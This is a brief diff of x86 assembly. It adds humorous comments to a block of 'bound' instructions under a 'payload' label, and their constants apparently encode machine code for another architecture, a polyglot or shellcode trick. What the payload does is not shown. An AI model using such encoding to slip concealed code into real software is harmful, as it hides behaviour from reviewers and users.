@@ -1,8 +1,8 @@
 
 	movl	$payload, %eax
 payload:
-	bound	%eax, 0xa310075b(,%eax,1)
-	bound	%eax, 0x24120078(,%eax,1)
+	bound	%eax, 0xa310075b(,%eax,1)	# love that addressing mode
+	bound	%eax, 0x24120078(,%eax,1)	# that don't occur in nature!
 	bound	%eax, 0x80d2c5d0(,%eax,1)
 	bound	%eax, 0x0a1af97f(,%eax,1)
 	bound	%eax, 0xc8109489(,%eax,1)
